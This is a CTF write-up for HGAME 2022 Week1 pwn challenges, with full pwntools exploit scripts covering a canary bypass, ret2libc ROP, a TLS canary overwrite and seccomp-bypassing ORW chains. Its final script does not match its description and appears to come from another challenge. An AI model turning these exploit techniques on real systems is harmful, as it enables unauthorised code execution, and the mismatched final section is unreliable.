---
title: "「PWN」【HGAME 2022 Week1】 Pwn Writeup WP Reproduction"
date: 2022-10-30
tags: ['CTF', 'Pwn', 'writeup', 'wp']
authors: [nova]

---

<!--truncate-->

# test_your_nc

This question is a basic process of using nc to get the flag.

Here is a method for brute-forcing (I didn't have proof of work when I did this):

Using `pwnlib.util.iters`'s `mbruteforce`

```python
proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed')
```



# test_your_gdb

By debugging with gdb to view the `encrypted_secret`, it was found that bypassing `memcpy` directly works.

Exp:

```python
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

# sh = process('./a.out')
sh = remote('chuj.top', 50610)
elf = ELF('./a.out')
libc = ELF('./libc-2.31.so')

payload = p64(0xB0361E0E8294F147) + p64(0x8c09e0c34ed8a6a9)
gdb.attach(sh, 'b *0x401380')
sh.recvuntil(b'word')
sh.send(payload)
sh.recv()
canary = u64(sh.recv()[24:32])
print(hex(canary))

payload = b'A'*(0x20-0x08) + p64(canary) + b'A'*0x08 + p64(elf.sym['b4ckd00r'])
sh.sendline(payload)
sh.interactive()
```



# enter_the_pwn_land

Using ret2rop, it is important to note that the value of the loop variable `i` will be modified, so manual adjustment is needed.

```python
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

# sh = process('./a.out')
sh = remote('chuj.top', 31525)
elf = ELF('./a.out')
libc = ELF('./libc-2.31.so')

pop_rdi_ret_addr = 0x0401313
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
test_thread_addr = elf.sym['test_thread']
ret_addr = 0x040101a

# gdb.attach(sh, 'b puts')
sh.send(b'8'*(0x30-0x04)+p32(0x30-0x04))
payload = b'A'*8
payload += p64(pop_rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(test_thread_addr)
sh.sendline(payload)
sh.recvline()
puts_addr = u64(sh.recvuntil('\n', drop=True).ljust(8, b'\x00'))
print(hex(puts_addr))

libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
sh.send(b'8'*(0x30-0x04)+p32(0x30-0x04))
payload = b'A'*8
payload += p64(ret_addr) + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(system_addr) + p64(0)
sh.sendline(payload)
sh.interactive()

```



# enter_the_evil_pwn_land

The main challenge in this question is bypassing the Canary protection mechanism.

The creation of a thread will create a TLS (Thread Local Storage) to store values like canary, which will be used to check if the canary has been modified. This TLS is stored at a high address of the stack, which means we have an opportunity to modify the canary value in the TLS.

However, it is worth noting that overflowing so many bytes will inevitably damage the program itself, leading to a crash (such as modifying pointers like tcb, dtv, self), so we can first use gdb to find the offset when debugging locally, and then calculate `libc_base`.

After obtaining `libc_base`, we can proceed with the overflow. Even if the program crashes, we have already reached `system("/bin/sh")` and can successfully obtain the flag.

Exp:

```python
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

sh = process('./a.out')
# sh = remote('chuj.top', 38068)
elf = ELF('./a.out')
libc = ELF('./libc-2.31.so')

pop_rdi_ret_addr = 0x401363
test_thread_addr = elf.sym['test_thread']
ret_addr = 0x040101a

offset = 2152  # 2152, 216

payload = b'A'*(0x20)

sh.sendline(payload)
sh.recvline()
b = u64(sh.recvuntil(b'\x0a', drop=True).ljust(8, b'\x00'))
b = str(hex(b)) + '00'
b = int(b, 16)
print(hex(b))

libc_offset = 0x7f7cde389700 - 0x7f7cde38d000
libc_base = b - libc_offset
system_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
gdb.attach(sh, 'b *0x401363')
payload = b'A'*(0x30-0x08)
payload += p64(0xdeadbeef)
payload += p64(0)
# payload += p64(ret_addr)
payload += p64(pop_rdi_ret_addr)
payload += p64(bin_sh_addr)
payload += p64(system_addr+3)
# payload += p64(ret_addr)
"""payload += p64(0x040135c) + p64(0) + p64(0) + p64(0) + p64(0)
payload += p64(0xe6c7e + libc_base)"""
payload += b'\x00'*(offset-len(payload)) + p64(0xdeadbeef)
sh.sendline(payload)
sh.interactive()
```



# oldfashion_orw

This question is quite interesting. After some research, it was found that this is an ORW (Open, Read, Write) challenge to get the flag.

Initially, reading the number of bytes, changing a signed number to an unsigned number was needed, so filling in a negative number could achieve this.

However, since the flag file name is unknown, OGW (Open, Getdents, Write) to read the file name is required as well.

Additionally, a point to note is that glibc uses `open`, `read`, etc., implemented using `openat`, which is disabled by seccomp. Therefore, system call numbers are needed to implement these functions.

Moreover, it was observed that many other write-ups utilize the method of reading the flag name first and then reading the file content in a subsequent connection, but attempts to replicate this behavior remotely failed. Therefore, a new shellcode approach had to be adopted.

Exp:

```python
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

# sh = process('./vuln')
sh = remote('chuj.top', 42614)
elf = ELF('./vuln')
libc = ELF('./libc-2.31.so')

pop_rdi_ret = 0x0401443
pop_rsi_r15_ret = 0x0401441
libc_pop_rdx_r12_ret = 0x011c371
libc_pop_rax_ret = 0x04a550
libc_syscall = 0x066229
bss_addr = 0x0404000

write_got = elf.got['write']
write_plt = elf.plt['write']
main_addr = elf.sym['main']

def gen_para_payload(para1: bytes, para2: bytes = None, para3: bytes = None) -> bytes:
    payload = b''
    payload += p64(pop_rdi_ret) + para1
    payload += p64(pop_rsi_r15_ret) + para2 + p64(0) if para2 else b''
    payload += p64(pop_rdx_r12_ret) + para3 + p64(0) if para3 else b''
    return payload

payload = b"A"*0x38
payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_addr)
sh.recvuntil(b"size?\n")
sh.send(b'-1')
sh.recvuntil(b"content?\n")
sh.sendline(payload)
sh.recvuntil(b"done!\n")

write_addr = u64(sh.recv(6).ljust(8, b"\x00"))
print(hex(write_addr))

libc_base = write_addr - libc.sym['write']
open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']
getdents64_addr = libc_base + libc.sym['getdents64']
pop_rdx_r12_ret = libc_base + libc_pop_rdx_r12_ret
pop_rax_ret = libc_base + libc_pop_rax_ret
syscall = libc_base + libc_syscall

sh.recvuntil(b"size?\n")
sh.send(b'-1')
sh.recvuntil(b"content?\n")
payload = b'a'*0x30 + p64(bss_addr+0x100) + p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rsi_r15_ret) + p64(bss_addr+0x100) + p64(0)
payload += p64(pop_rdx_r12_ret) + p64(0x30) + p64(0)
payload += p64(pop_rax_ret) + p64(0)
payload += p64(syscall) + p64(main_addr)
sh.sendline(payload)
sh.recvuntil(b"done!\n")
payload = b'./\x00'
sh.sendline(payload)

sh.recvuntil(b"size?\n")
sh.send(b'-1')
sh.recvuntil(b"content?\n")
payload = b"A"*0x30 + p64(bss_addr + 0x100)
payload += p64(pop_rax_ret) + p64(0x2)
payload += gen_para_payload(p64(bss_addr + 0x100), p64(0x10000), p64(0))
payload += p64(syscall)

payload += p64(pop_rax_ret) + p64(78)
payload += gen_para_payload(p64(3), p64(bss_addr + 0x100), p64(0x1000))
payload += p64(syscall)

payload += p64(pop_rax_ret) + p64(0x1)
payload += gen_para_payload(p64(1), p64(bss_addr + 0x100), p64(0x1000))
payload += p64(syscall)
payload += p64(main_addr)
sh.sendline(payload)
sh.recvuntil(b"done!\n")
sh.interactive()
```



Finally, the chosen method was to use `mprotect` to change permissions and then write a shellcode.

It should be noted that in this question, many write-ups read the flag name first and then read the file content in a subsequent connection. However, due to changes in the flag name with each new connection, a different approach was adopted for this write-up.

Exp:

```python
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

sh = process('./vuln')
elf = ELF('./vuln')
libc = ELF('./libc-2.31.so')

pop_rdi_ret = 0x0401443
pop_rsi_r15_ret = 0x0401441
libc_pop_rdx_r12_ret = 0x011c371
libc_pop_rax_ret = 0x04a550
libc_syscall = 0x066229
bss_addr = 0x0404000

write_got = elf.got['write']
write_plt = elf.plt['write']
main_addr = elf.sym['main']

payload = b"A"*0x38
payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_addr)
sh.recvuntil(b"size?\n>> ")
sh.sendline(b'4')

sh.recvuntil(b"how many nodes?\n>> ")
sh.sendline(b'2')
sh.recvuntil(b"how many edges?\n>> ")
sh.sendline(b'0')
sh.recvuntil(b"you want to start from which node?\n>> ")
sh.sendline(b'0')
sh.recvuntil(b">> ")
sh.sendline(b'-2275')

sh.recvuntil(b"the length of the shortest path is ")
elf_base = int(sh.recv(15), 10) - 0x7008
success('elf_base=>' + hex(elf_base))

sh.recvuntil(b"how many nodes?\n>> ")
sh.sendline(b'2')
sh.recvuntil(b"how many edges?\n>> ")
sh.sendline(b'0')
sh.recvuntil(b"you want to start from which node?\n>> ")
sh.sendline(b'0')
sh.recvuntil(b">> ")
payload = bytes(str((elf.got['puts'] - elf.sym['dist']) // 8).encode('UTF-8'))
sh.sendline(payload)

sh.recvuntil(b"the length of the shortest path is ")
libc_base = int(sh.recv(15), 10) - libc.sym['puts']
success('libc_base=>' + hex(libc_base))
```

<!-- AI -->
